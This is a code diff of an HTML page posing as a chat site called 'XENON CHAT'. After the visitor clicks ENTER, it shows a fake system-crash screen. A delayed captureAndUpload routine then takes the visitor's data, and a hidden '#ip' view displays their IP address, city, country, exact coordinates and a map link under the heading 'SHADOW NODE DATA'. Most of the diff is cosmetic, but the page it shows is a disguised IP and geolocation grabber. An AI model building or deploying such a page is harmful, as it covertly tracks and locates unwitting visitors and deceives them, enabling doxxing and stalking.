@@ -45,19 +45,12 @@
             font-size: 4.5rem;
             letter-spacing: 12px;
             animation: glitch 4s infinite;
-            text-shadow: 
-                0.05em 0 0 #f00,
-                -0.03em -0.04em 0 #0ff,
-                0.025em 0.04em 0 #f0f;
+            text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f;
         }
         @keyframes glitch {
-            0% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
-            14% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
-            15% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
-            49% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
-            50% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
-            99% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
-            100% { text-shadow: -0.025em 0 0 #f00, -0.025em -0.04em 0 #0ff, -0.025em -0.04em 0 #f0f; }
+            0%,100% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            20% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            40% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
         }
         button.enter {
             margin-top: 80px;
@@ -76,16 +69,9 @@
             color: #000;
             box-shadow: 0 0 40px #0f08;
         }
-        #frozen p {
-            margin: 8px 0;
-            opacity: 0.7;
-        }
-        .blink {
-            animation: blink 1.2s step-end infinite;
-        }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+        #frozen p { margin: 8px 0; opacity: 0.7; }
+        .blink { animation: blink 1.2s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
         #ip-view {
             position: absolute;
             inset: 0;
@@ -100,43 +86,20 @@
             font-size: 1.8rem;
             text-align: center;
         }
-        #ip-display {
-            font-size: 3rem;
-            letter-spacing: 3px;
-            margin: 20px 0;
-            word-break: break-all;
-            max-width: 90%;
-        }
-        #geo {
-            font-size: 2rem;
-            color: #0f8;
-            margin: 20px 0;
-        }
-        #maplink {
-            font-size: 1.6rem;
-            color: #0ff;
-            margin: 40px 0;
-            text-decoration: none;
-        }
-        #maplink:hover {
-            text-decoration: underline;
-        }
-        #status {
-            font-size: 1.2rem;
-            color: #555;
-            margin-top: 60px;
-        }
+        #ip-display { font-size: 3rem; letter-spacing: 3px; margin: 20px 0; word-break: break-all; max-width: 90%; }
+        #geo { font-size: 2rem; color: #0f8; margin: 20px 0; }
+        #maplink { font-size: 1.6rem; color: #0ff; margin: 40px 0; text-decoration: none; }
+        #maplink:hover { text-decoration: underline; }
+        #status { font-size: 1.2rem; color: #555; margin-top: 60px; }
     </style>
 </head>
 <body>
 
-    <!-- Entry screen with single big button -->
     <div id="landing">
         <div class="glitch">XENON CHAT</div>
         <button class="enter" onclick="enterXenon()">ENTER</button>
     </div>
 
-    <!-- "Frozen" black screen that looks crashed/hacked/frozen -->
     <div id="frozen">
         <p>SYSTEM FAILURE - CRITICAL ERROR 0x0000007B</p>
         <p>INACCESSIBLE_BOOT_DEVICE</p>
@@ -148,7 +111,6 @@
         <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
     </div>
 
-    <!-- Hidden /#ip view page -->
     <div id="ip-view">
         <div>SHADOW NODE DATA</div>
         <div id="ip-display">—</div>
@@ -168,13 +130,11 @@
 
         function enterXenon() {
             document.getElementById("landing").style.display = "none";
-            const frozen = document.getElementById("frozen");
-            frozen.style.display = "flex";
+            document.getElementById("frozen").style.display = "flex";
 
-            // Fake frozen delay then capture/upload
             setTimeout(() => {
                 captureAndUpload();
-            }, 12000);
+            }, 12000);  // fake delay for "frozen" feel
         }
 
         async function captureAndUpload() {
@@ -199,10 +159,8 @@
                     });
                 }
             } catch (e) {}
-            // Stay frozen-looking
         }
 
-        // /#ip viewer (add #ip to URL to see shared data)
         async function showIpView() {
             document.getElementById("landing").style.display = "none";
             document.getElementById("frozen").style.display = "none";
@@ -223,23 +181,21 @@
                     ipEl.textContent = data.ip;
                     const g = data.geo || {};
                     geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
-
                     if (g.lat && g.lon) {
                         mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
                         mapEl.style.display = "block";
                     }
-                    status.textContent = `room: ${ROOM} • last sync: ${new Date(data.ts).toLocaleString()}`;
+                    status.textContent = `room: ${ROOM} • captured: ${new Date(data.ts).toLocaleString()}`;
                 } else {
-                    ipEl.textContent = "NO DATA";
-                    status.textContent = "room empty";
+                    ipEl.textContent = "NO DATA YET";
+                    status.textContent = "no capture in this room";
                 }
             } catch (e) {
-                ipEl.textContent = "ERROR";
-                status.textContent = "failed to fetch";
+                ipEl.textContent = "FETCH ERROR";
+                status.textContent = "could not load data";
             }
         }
 
-        // Auto-check hash on load/change
         function checkHash() {
             if (location.hash === "#ip") {
                 showIpView();
